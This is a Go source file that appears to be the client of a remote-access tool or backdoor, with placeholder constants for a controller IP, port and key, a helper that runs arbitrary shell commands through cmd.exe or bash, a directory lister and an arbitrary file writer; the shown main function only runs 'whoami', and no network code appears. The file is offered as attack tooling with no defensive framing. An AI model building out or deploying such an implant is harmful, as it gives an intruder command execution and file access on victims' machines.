package main

import (
	"os"
	"fmt"
	"runtime"
	"strings"
	"os/exec"
	"io/ioutil"
)

var sys = map[string]string{
  "windows": "cmd.exe,/c",
  "linux": "/bin/bash,-c",
}
const (
	IP 	 = "{IP}"
	PORT = "{PORT}"
	KEY  = "{KEY}"
)
func system(todo string) (string) {
	call_os := strings.Split(sys[runtime.GOOS], ",")
	if todo[:2] == "cd" {
		os.Chdir(todo[3:])
		newDir, err := os.Getwd()
	    if err != nil {
        	return err.Error()
    	}
	    return newDir
	}
	out, err := exec.Command(call_os[0], call_os[1], todo).Output()
    if err != nil {
        	return err.Error()
    }
    return string(out)
}
func broswer(path string) []string {
	list_files := []string {}
	if path[len(path)-1:len(path)] != "/" {
		path += "/"
	}
	files, err := ioutil.ReadDir(path)
    if err != nil {
    	return [] string {err.Error()}
    }
    for _, f := range files {
		f.Name()
        list_files = append(list_files, path + f.Name())
    }
    return list_files
}
func write_file(path string, context string) (string) {
    err := os.WriteFile(path, []byte(context), 0644)
	if err != nil {
        return err.Error()
    }
    return path
}

func main(){

	fmt.Println(system("whoami"));
}